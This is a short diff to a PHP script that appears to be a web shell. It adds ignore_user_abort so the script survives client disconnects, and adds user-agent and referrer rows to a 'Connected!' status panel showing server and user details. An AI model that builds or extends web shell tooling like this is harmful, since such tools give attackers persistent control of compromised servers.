@@ -7,6 +7,8 @@ error_reporting(0);
 
 set_time_limit(0);
 
+ignore_user_abort(true);
+
 $shell = $_SERVER["PHP_SELF"];
 
 header("Expires: Sun, 01 Jan 2000 00:00:00 GMT");
@@ -254,6 +256,8 @@ echo( sprintf("
 
 	<table>
 		<tr><td>Your IP</td><td>%s</td></tr>
+		<tr><td>User Agent</td><td>%s</td></tr>
+		<tr><td>Referrer</td><td>%s</td></tr>
 		<tr><td>Status</td><td>Connected! @ %s : %s</td></tr>
 		<tr><td>Date Time</td><td>%s</td></tr>
 		<tr><td>User</td><td>%s</td></tr>
@@ -266,6 +270,8 @@ echo( sprintf("
 	</table>
 	",
 	$_SERVER["REMOTE_ADDR"],
+	$_SERVER["HTTP_USER_AGENT"],
+	$_SERVER['HTTP_REFERER'],
 	$_SERVER["SERVER_ADDR"],
 	$_SERVER["SERVER_PORT"],
 	date("Y-m-d H:i:s"),
